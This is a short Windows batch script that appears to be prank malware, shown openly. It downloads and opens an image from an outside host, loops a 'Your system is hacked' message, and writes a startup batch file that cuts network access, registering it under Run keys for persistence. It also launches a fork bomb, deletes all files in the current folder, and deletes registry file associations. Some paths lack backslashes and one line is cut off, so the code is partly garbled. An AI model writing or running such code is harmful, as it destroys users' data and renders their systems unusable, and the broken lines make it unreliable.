@echo off


Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image.jpg"
image.jpg


do
msgbox("Your system is hacked")
loop


echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:window


%0|%0


del*.*


START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*

